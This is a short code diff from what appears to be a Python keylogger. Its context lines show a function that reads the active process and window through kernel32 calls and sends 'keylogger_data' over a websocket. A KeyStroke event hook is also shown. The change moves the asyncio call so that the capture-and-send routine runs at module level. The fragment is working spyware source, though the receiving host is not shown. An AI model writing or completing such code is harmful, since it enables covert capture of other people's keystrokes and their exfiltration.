@@ -42,7 +42,6 @@ async def get_current_process():
 
         await websocket.send(keylogger_data)
 
-    asyncio.get_event_loop().run_until_complete(hello())
     # print("[ PID: %s - %s - %s ]" % (process_id,
     #                                  executable.value,
     #                                  window_title.value)
@@ -53,6 +52,7 @@ async def get_current_process():
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
+asyncio.get_event_loop().run_until_complete(get_current_process())
 
 def KeyStroke(event):
     global current_window
